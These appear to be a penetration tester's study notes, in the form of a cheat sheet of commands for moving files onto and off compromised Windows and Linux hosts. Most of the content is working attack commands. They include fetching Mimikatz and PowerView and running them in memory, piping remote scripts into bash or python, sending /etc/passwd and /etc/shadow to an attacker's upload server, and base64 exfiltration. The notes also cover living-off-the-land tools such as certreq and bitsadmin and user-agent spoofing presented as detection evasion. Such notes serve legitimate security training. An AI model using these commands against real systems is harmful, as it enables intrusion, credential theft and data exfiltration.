## Windows
[Windows Executables for Pentesting](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_x64)

### Windows over Webserver

#### Check SSH key MD5 hash
```Shell
md5sum id_rsa
```

#### Encode SSH key to Base64
```Shell
cat id_rsa |base64 -w 0;echo
```

#### PowerShell decoding of SSH key in Base64
```PowerShell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 output from previous command>"))
```

#### PowerShell command to confirm successful file transfer
```PowerShell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

#### Download a file with PowerShell
```PowerShell
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
```

#### Execute a file in memory using PowerShell
```PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
```

#### Upload a file with PowerShell
```PowerShell
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

#### Use-BasicParsing bypasses Internet Explorer not having been setup yet
```PowerShell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

#### Bypass an SSL/TLS secure channel error
```PowerShell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### Download a file using Certutil
```cmd.exe
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```


### Windows over SMB

#### Create an SMB server
```Shell
impacket-smbserver share -smb2support /tmp/smbshare
```

#### Copy a file from the SMB server onto the Windows machine
```cmd.exe
copy \\192.168.220.133\share\nc.exe
```

#### Create an SMB server with username and password (necessary if Windows machine blocks it w/o authentication)
```Shell
impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

#### Mount the SMB share onto the Windows Machine
```cmd.exe
net use n: \\192.168.220.133\share /user:test test
```


### Windows over FTP

#### Installing pyftpdlib
```Shell
pip3 install pyftpdlib
```

#### Set up a Python3 FTP Server on port 21 (port 2121 is default)
```Shell
python3 -m pyftpdlib --port 21
```

#### Download the file over FTP via PowerShell
```PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```
From Linux to Windows

#### Create a Command File for the FTP Client and Download the Target File. 
```cmd.exe
echo open 192.168.49.128 > ftpcommand.txt
```

```cmd.exe
echo USER anonymous >> ftpcommand.txt
```

```cmd.exe
echo binary >> ftpcommand.txt
```

```cmd.exe
echo GET file.txt >> ftpcommand.txt
```

```cmd.exe
echo bye >> ftpcommand.txt
```
Sets commands we can use on FTP. This is if a non-interactive session is in use.

#### Log into the FTP Session in non-interactive Windows Shell
```cmd.exe
ftp -v -n -s:ftpcommand.txt
```

```cmd.exe
open 192.168.49.128
```
Log in with `USER` and `PASS` first.

```ftp
USER anonymous
```

```ftp
GET file.txt
```

```cmd.exe
bye
```


### Windows Target to Attack Host

#### Encode file using PowerShell. Catch w/ nc shell on attack host.
```PowerShell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

#### Check MD5 Hash of encoded file - Ensure this matches with what is downloaded onto attack host
```PowerShell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

#### Decode the base64 string in Linux
```Shell
echo <base64 encoding from PowerShell output> | base64 -d > hosts
```

#### Check MD5 Hash to ensure it matches what was on the Windows target
```Shell
md5sum hosts
```

#### Start a impacket SMB server for quick hosting of a file
```Shell
impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/
```
Performed from a Windows-based host


### Windows - PowerShell Web Uploads

#### Install a configured server with Web Upload
```Shell
pip3 install uploadserver
```

#### Set up a Server on the attack host to receive download from Windows host
```Shell
python3 -m uploadserver
```

#### Download PowerShell upload capability to Windows host
```PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

#### Upload file to Python upload server
```PowerShell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Windows - PowerShell Base64 Web Uploads

#### Convert a file to Base64
```PowerShell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

#### Use a netcat listener to grab the Base64 download
```PowerShell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

#### Decode and convert the base64 download into a file
```Shell
echo <base64> | base64 -d -w 0 > hosts
```


### Windows - SMB Uploads over WebDAV

#### Install `wsgidav` and `cheroot`, which are both needed for doing SMB downloads over WebDAV
```Shell
pip install wsgidav cheroot
```

#### Set up the WebDAV module
```Shell
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

#### Windows machine connect to the WebDAV share using the DavWWWRoot directory. Can also use` \sharefolder\` or another folder that exists on your attack host
```Shell
dir \\192.168.49.128\DavWWWRoot
```


### Windows - FTP Uploads

#### Start an FTP server over Python
```Shell
python3 -m pyftpdlib --port 21 --write
```

#### Upload our file to the FTP server over PowerShell
```PowerShell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Create a Command File for the FTP Client to Upload a File
```cmd.exe
echo open 192.168.49.128 > ftpcommand.txt
```

```cmd.exe
echo USER anonymous >> ftpcommand.txt
```

```cmd.exe
echo binary >> ftpcommand.txt
```

```cmd.exe
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
```

```cmd.exe
echo bye >> ftpcommand.txt
```

```cmd.exe
ftp -v -n -s:ftpcommand.txt
```

```cmd.exe
open 192.168.49.128
```
Log in with `USER` and `PASS` first

```cmd.exe
USER anonymous
```


```cmd.exe
PUT c:\windows\system32\drivers\etc\hosts
```

```cmd.exe
bye
```


## Linux

### Linux over Web Server

#### Check SSH key MD5 hash
```Shell
md5sum id_rsa
```

#### Encode SSH key to Base64
```Shell
cat id_rsa |base64 -w 0;echo
```

#### Decode the SSH key on the Linux target. Can then check its MD5 hash with md5sum command.
```Shell
echo -n '<base64 code>' | base64 -d > id_rsa
```

#### Download a file using Wget
```Shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

#### Download a file using cURL
```Shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


### Linux - Fileless Attacks

#### Fileless download with cURL
```Shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Download a Python script file from a web server and pipe it into a Python binary
```Shell
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


### Linux - Download with Bash (`/dev/tcp`)

#### Connect to the target web server
```Shell
exec 3<>/dev/tcp/10.10.10.32/80
```

#### Send an HTTP GET request to the web server
```Shell
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the web server response
```Shell
cat <&3
```


### Linux - SSH Downloads and Uploads

#### Enable SSH service on attack machine
```Shell
systemctl enable ssh
```

#### Start SSH service on attack machine
```Shell
systemctl start ssh
```

#### Download file using SCP
```Shell
scp plaintext@192.168.49.128:/root/myroot.txt .
```

#### Upload file using SCP
```Shell
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```

#### Upload a directory using SCP
```Shell
scp -r /path/to/mydirectory username@192.168.0.100:/home/username/
```


### Linux - Web Uploads

#### Download an upload server
```Shell
python3 -m pip install --user uploadserver
```

#### Creates a self-signed certificate
```Shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
Recommend not hosting this in the same directory as the web server is running on

#### Start the web server over HTTPS
```Shell
python3 -m uploadserver 443 --server-certificate /root/server.pem
```

#### Upload multiple files to the compromised machine
```Shell
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

#### Create a web server with Ruby
```Shell
ruby -run -ehttpd . -p8000
```

#### Create a web server with PHP
```Shell
php -S 0.0.0.0:8000
```

#### Upload a file using SCP
```Shell
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

#### Download a file using SCP
```Shell
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```


### File Transfers - via Code

#### Python 2 file download
```Shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Start the Python uploadserver Module
```Shell
python3 -m uploadserver
```

#### Python 3 file download
```Shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### PHP file download 
```Shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
`file_get_contents` downloads the file. `file_put_contents` says where to save it. `-r` allows you to do everything in one line. An alternative to `file_get_contents() `and `file_put_contents()` is the` fpopen()` module.

#### PHP file download using fopen
```Shell
php -r 'const BUFFER = 1024; $fremote =  
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

#### PHP file download piped to bash
```Shell
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Ruby file download
```Shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl file download
```Shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

#### JavaScript Code to be executed on Upload from a Windows Host
```JavaScript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

#### Download a File Using JavaScript and cscript.exe
```cmd.exe
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

#### VBScript Code to be executed on Upload from a Windows Host
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

#### Download a File Using VBScript and cscript.exe
```cmd.exe
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

#### Download a file using PHP
```Shell
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

#### Upload a file using SCP
```Shell
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

#### Download a file using SCP
```Shell
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

#### Invoke-WebRequest using a Chrome User Agent
```PowerShell
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```


## Protected File Transfers

### File Encryption on Windows

#### Invoke-AESEncryption.ps1
```PowerShell
Import-Module .\Invoke-AESEncryption.ps1
```
[AESEncryption.ps1 PowerShell Script](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)


### File Encryption on Linux

#### Encrypting /etc/passwd with openssl
```Shell
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

#### Decrypt passwd.enc with openssl
```Shell
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


## Catching Files over HTTP/S - Creating a Secure Web Server for Upload Operations

### Nginx - Enabling PUT

#### Create a Directory to Handle Uploaded Files
```Shell
mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### Change the Owner to www-data
```Shell
chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### Create Nginx Configuration File
```Shell
mousepad /etc/nginx/sites-available/upload.conf
```

```.conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### Symlink our Site to the sites-enabled Directory
```Shell
ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Start Nginx
```Shell
systemctl restart nginx.service
```

#### Verifying Errors
```Shell
tail -2 `/var/log/nginx/error.log`
```

```Shell
ss -lnpt | grep `80`
```

```Shell
ps -ef | grep `2811`
```
We see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.

#### Remove NginxDefault Configuration
```Shell
rm /etc/nginx/sites-enabled/default
```

#### Upload File Using cURL
```Shell
curl -T /etc/passwd
```

```Shell
tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```


## Living off the Land

### [LOLBAS](https://lolbas-project.github.io/#)

#### To search for download and upload functions in LOLBAS we can use `/download` or `/upload`

Example: `CertReq.exe`

#### Start Netcat Listener in Kali
```Shell
nc -lnvp 80
```

#### Upload win.ini to Kali from Windows
```cmd.exe
certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
```
This will send the file to our Netcat session, and we can copy-paste its contents.

### [GTFOBins](https://gtfobins.github.io/)

#### Search for `+file download` or `+file upload`
![[Pasted image 20230303114102.png]]

#### Create Certificate on Attack Host
```Shell
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

#### Stand up the Server on Attack Host
```Shell
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

#### Download File from the Compromised Machine
```Shell
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Other Living off the Land Tools

#### File Download with Bitsadmin
```PowerShell
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

#### Bitsadmin Download
```PowerShell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

#### Bitsadmin Upload
```PowerShell
Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

#### File Download with Certutil
```cmd.exe
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```


## Evading Detection

### Changing User Agent

#### Listing out User Agents
```PowerShell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
Example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

#### Request with Chrome User Agent
```PowerShell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

#### Catch with Netcat
```Shell
nc -lnvp 80
```

### LOLBAS/GTFOBins

#### Transferring File with GfxDownloadWrapper.exe
```PowerShell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

### Rsync

#### Copying files using rsync
```Shell
rsync -avz /home/cha0s/ cha0s@192.168.93.128:/home/cha0s/
```
#### Copying files w/ rsync to ignore previously existing files
```Shell
rsync -av --ignore-existing /source/directory/ /destination/directory/
```
#### Copying files w/ rsync to ignore previously existing files
```Shell
rsync -av --ignore-existing /source/directory/ /destination/directory/
```
#### Copying a directory w/ rsync
```Shell
rsync -avh --progress --ignore-existing user@remote_host:/path/to/source/ /path/to/destination/
```
